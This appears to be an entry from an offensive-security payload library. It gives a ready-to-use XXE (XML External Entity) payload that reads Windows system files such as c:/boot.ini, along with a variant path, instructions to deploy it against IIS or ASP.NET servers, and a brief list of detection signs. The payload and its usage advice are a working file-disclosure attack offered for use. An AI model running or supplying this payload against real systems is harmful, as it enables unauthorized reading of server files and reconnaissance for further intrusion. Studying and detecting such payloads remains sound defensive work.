---
id: dac109e6-ea00-4286-b98d-40696003f2de
name: XXE-Payload-Windows-Boot-Ini
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.134034+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - Web
tags:
  - xxe
  - payload
  - file-read
  - windows
validated: true
---

# XXE-Payload-Windows-Boot-Ini

## Code

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```

## Description

Windows-specific XXE payload targeting c:/boot.ini to disclose boot configuration, which may reveal OS details or paths. Uses file:// URI adapted for Windows paths, with encoding for compatibility.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| file:///c:/boot.ini | Windows file path | file:///c:/windows/win.ini |

## Usage

Deploy against IIS or ASP.NET apps parsing XML on Windows servers using [[commands/curl-send-xxe-payload]]. Helps in OS fingerprinting or finding misconfigurations.

## Detection

- Windows event logs for file access via XML processes (e.g., IIS).
- Network proxies logging requests with Windows-specific paths.
- Antivirus scanning for XXE in XML traffic to system files.

## Related

- [[procedures/File-Retrieval-via-XXE-Injection]]
